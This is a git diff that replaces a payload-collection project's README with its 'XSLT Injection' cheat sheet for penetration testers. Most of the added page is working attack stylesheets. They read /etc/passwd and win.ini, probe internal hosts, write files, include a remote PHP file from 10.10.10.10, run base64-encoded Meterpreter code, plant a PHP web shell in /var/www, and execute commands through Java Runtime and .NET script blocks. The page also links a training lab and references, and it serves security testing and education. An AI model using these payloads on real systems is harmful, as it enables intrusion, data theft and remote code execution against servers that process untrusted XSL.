@@ -1,54 +1,252 @@
-[README.md](https://github.com/user-attachments/files/34879050/README.md)
-# Payloads All The Things
+# XSLT Injection
 
-A list of useful payloads and bypasses for Web Application Security.
-Feel free to improve with your payloads and techniques!
+> Processing an un-validated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code
 
-You can also contribute with a :beers: IRL, or using the sponsor button.
+## Summary
 
-[![Sponsor](https://img.shields.io/static/v1?label=Sponsor&message=%E2%9D%A4&logo=GitHub&link=https://github.com/sponsors/swisskyrepo)](https://github.com/sponsors/swisskyrepo)
-[![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?text=Payloads%20All%20The%20Things,%20a%20list%20of%20useful%20payloads%20and%20bypasses%20for%20Web%20Application%20Security%20-%20by%20@pentest_swissky&url=https://github.com/swisskyrepo/PayloadsAllTheThings/)
+- [Tools](#tools)
+- [Methodology](#methodology)
+    - [Determine the Vendor And Version](#determine-the-vendor-and-version)
+    - [External Entity](#external-entity)
+    - [Read Files and SSRF Using Document](#read-files-and-ssrf-using-document)
+    - [Write Files with EXSLT Extension](#write-files-with-exslt-extension)
+    - [Remote Code Execution with PHP Wrapper](#remote-code-execution-with-php-wrapper)
+    - [Remote Code Execution with Java](#remote-code-execution-with-java)
+    - [Remote Code Execution with Native .NET](#remote-code-execution-with-native-net)
+- [Labs](#labs)
+- [References](#references)
 
-An alternative display version is available at [PayloadsAllTheThingsWeb](https://swisskyrepo.github.io/PayloadsAllTheThings/).
+## Tools
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/.github/banner.png" alt="banner">
-</p>
+No known tools currently exist to assist with XSLT exploitation.
 
-## :book: Documentation
+## Methodology
 
-Every section contains the following files, you can use the `_template_vuln` folder to create a new chapter:
+### Determine the Vendor and Version
 
-- README.md - vulnerability description and how to exploit it, including several payloads
-- Intruder - a set of files to give to Burp Intruder
-- Images - pictures for the README.md
-- Files - some files referenced in the README.md
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/fruits">
+ <xsl:value-of select="system-property('xsl:vendor')"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
 
-You might also like the other projects from the AllTheThings family :
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body>
+<br />Version: <xsl:value-of select="system-property('xsl:version')" />
+<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+</body>
+</html>
+```
 
-- [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/) - Active Directory and Internal Pentest Cheatsheets
-- [HardwareAllTheThings](https://swisskyrepo.github.io/HardwareAllTheThings/) - Hardware/IOT Pentesting Wiki
+### External Entity
 
-You want more? Check the [Books](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/_LEARNING_AND_SOCIALS/BOOKS.md) and [YouTube channel](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/_LEARNING_AND_SOCIALS/YOUTUBE.md) selections.
+Don't forget to test for XXE when you encounter XSLT files.
 
-## :technologist: Contributions
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/fruits">
+    Fruits &ext_file;:
+    <!-- Loop for each fruit -->
+    <xsl:for-each select="fruit">
+      <!-- Print name: description -->
+      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
+    </xsl:for-each>
+  </xsl:template>
+</xsl:stylesheet>
+```
 
-Be sure to read [CONTRIBUTING.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CONTRIBUTING.md)
+### Read Files and SSRF Using Document
 
-<p align="center">
-<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=swisskyrepo/PayloadsAllTheThings&max=36" alt="sponsors-list" >
-</a>
-</p>
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/fruits">
+    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
+    <xsl:copy-of select="document('/etc/passwd')"/>
+    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
+    Fruits:
+     <!-- Loop for each fruit -->
+    <xsl:for-each select="fruit">
+      <!-- Print name: description -->
+      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
+    </xsl:for-each>
+  </xsl:template>
+</xsl:stylesheet>
+```
 
-Thanks again for your contribution! :heart:
+### Write Files with EXSLT Extension
 
-## :beers: Sponsors
+EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language.
 
-This project is proudly sponsored by these companies.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:exploit="http://exslt.org/common" 
+  extension-element-prefixes="exploit"
+  version="1.0">
+  <xsl:template match="/">
+    <exploit:document href="evil.txt" method="text">
+      Hello World!
+    </exploit:document>
+  </xsl:template>
+</xsl:stylesheet>
+```
 
-| Logo                                                                                                                                                                                                  | Description                                                                                                                                          |
-| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
-| [<img src="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/.github/sponsors/serpapi.png" alt="sponsor-serpapi">](https://serpapi.com)                            | **SerpApi** is a real time API to access Google search results. It solves the issues of having to rent proxies, solving captchas, and JSON parsing.  |
-| [<img src="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/.github/sponsors/projectdiscovery.png" alt="sponsor-projectdiscovery">](https://projectdiscovery.io/) | **ProjectDiscovery** - Detect real, exploitable vulnerabilities. Harness the power of Nuclei for fast and accurate findings without false positives. |
-| [<img src="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/.github/sponsors/vaadata.png" alt="sponsor-vaadata">](https://www.vaadata.com/)                       | **VAADATA** - Ethical Hacking Services                                                                                                               |
+### Remote Code Execution with PHP Wrapper
+
+Execute the function `readfile`.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body>
+<xsl:value-of select="php:function('readfile','index.php')" />
+</body>
+</html>
+```
+
+Execute the function `scandir`.
+
+```xml
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
+  <xsl:template match="/">
+    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+Execute a remote php file using `assert`
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+  <xsl:variable name="payload">
+    include("http://10.10.10.10/test.php")
+  </xsl:variable>
+  <xsl:variable name="include" select="php:function('assert',$payload)"/>
+</body>
+</html>
+```
+
+Execute a PHP meterpreter using PHP wrapper.
+
+```xml
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
+  <xsl:template match="/">
+    <xsl:variable name="eval">
+      eval(base64_decode('Base64-encoded Meterpreter code'))
+    </xsl:variable>
+    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+Execute a remote php file using `file_put_contents`
+
+```xml
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
+  <xsl:template match="/">
+    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+### Remote Code Execution with Java
+
+```xml
+  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
+    <xsl:template match="/">
+      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
+      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
+      <xsl:variable name="processString" select="ob:toString($process)"/>
+      <xsl:value-of select="$processString"/>
+    </xsl:template>
+  </xsl:stylesheet>
+```
+
+```xml
+<xml version="1.0"?>
+<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
+<xsl:template match="/">
+<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
+</xsl:template>.
+</xsl:stylesheet>
+```
+
+### Remote Code Execution with Native .NET
+
+```xml
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
+    <msxsl:script implements-prefix="App" language="C#">
+      <![CDATA[
+        public string ToShortDateString(string date)
+          {
+              System.Diagnostics.Process.Start("cmd.exe");
+              return "01/01/2001";
+          }
+      ]]>
+    </msxsl:script>
+    <xsl:template match="ArrayOfTest">
+      <TABLE>
+        <xsl:for-each select="Test">
+          <TR>
+          <TD>
+            <xsl:value-of select="App:ToShortDateString(TestDate)" />
+          </TD>
+          </TR>
+        </xsl:for-each>
+      </TABLE>
+    </xsl:template>
+</xsl:stylesheet>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+xmlns:user="urn:my-scripts">
+
+<msxsl:script language = "C#" implements-prefix = "user">
+<![CDATA[
+public string execute(){
+System.Diagnostics.Process proc = new System.Diagnostics.Process();
+proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
+proc.StartInfo.RedirectStandardOutput = true;
+proc.StartInfo.UseShellExecute = false;
+proc.StartInfo.Arguments = "/c dir";
+proc.Start();
+proc.WaitForExit();
+return proc.StandardOutput.ReadToEnd();
+}
+]]>
+</msxsl:script>
+
+  <xsl:template match="/fruits">
+  --- BEGIN COMMAND OUTPUT ---
+ <xsl:value-of select="user:execute()"/>
+  --- END COMMAND OUTPUT --- 
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+## Labs
+
+- [Root Me - XSLT - Code execution](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)
+
+## References
+
+- [From XSLT code execution to Meterpreter shells - Nicolas Grégoire (@agarri) - July 2, 2012](https://web.archive.org/web/20190820014239/https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
+- [XSLT Injection - Fortify - January 16, 2021](http://web.archive.org/web/20210116001237/https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)
+- [XSLT Injection Basics - Saxon - Hunnic Cyber Team - August 21, 2019](http://web.archive.org/web/20190821174700/https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/)
+- [Getting XXE in Web Browsers using ChatGPT - Igor Sak-Sakovskiy - May 22, 2024](https://web.archive.org/web/20260121165846/https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/)
+- [XSLT injection lead to file creation - PT SWARM (@ptswarm) - May 30, 2024](https://web.archive.org/web/20241006180803/https://twitter.com/ptswarm/status/1796162911108255974/photo/1)
